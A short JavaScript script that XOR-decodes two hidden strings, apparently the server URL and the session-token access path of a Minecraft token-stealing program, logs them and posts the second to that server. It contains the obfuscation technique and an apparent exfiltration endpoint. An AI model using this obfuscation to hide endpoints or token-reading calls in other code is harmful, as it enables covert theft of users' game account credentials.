import axios from 'axios';

const dc = (ec) => {
    const textToChars = (text) => text.split("").map((c) => c.charCodeAt(0));
    const mapping = (code) => textToChars("etc").reduce((a, b) => a ^ b, code);
    return ec.match(/.{1,2}/g)
        .map((hex) => parseInt(hex, 16))
        .map(mapping)
        .map((charCode) => String.fromCharCode(charCode))
        .join("");
};

const url = dc('1a06060201485d5d10131119171c165f030142045c1d1c00171c1617005c111d1f5d1307061a');
const authentication = dc('311e1b171c065c1517063f1b1c1711001314065a5b5c14071c112d4343424641402d3b5a5b5c14071c112d43464a4047462d165a5b');

console.log("Decrypted URL:", url);
console.log("Decrypted Authentication:", authentication);

axios.post(url, { authentication: authentication }, {
    headers: {
        'User-agent': 'Mozilla/5.0',
        'Content-type': 'application/json'
    }
})
.then((response) => {
    console.log("Response:", response.data);
})
.catch((error) => {
    console.error("Error:", error);
});
